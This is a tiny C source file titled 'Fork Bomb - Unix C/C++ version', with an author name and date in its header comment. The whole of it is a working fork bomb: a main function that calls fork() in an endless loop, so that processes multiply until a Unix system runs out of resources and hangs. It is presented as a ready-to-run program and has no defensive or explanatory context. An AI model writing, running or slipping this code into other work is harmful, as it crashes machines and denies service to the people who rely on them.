/*
 * Fork Bomb - Unix C/C++ version
 * 
 * Author: Tommy
 * Date: 2009-10-03 18:51
 */


#include <unistd.h>
 
int main(void)
{
	for(;;)
		fork();
	return 0;
}
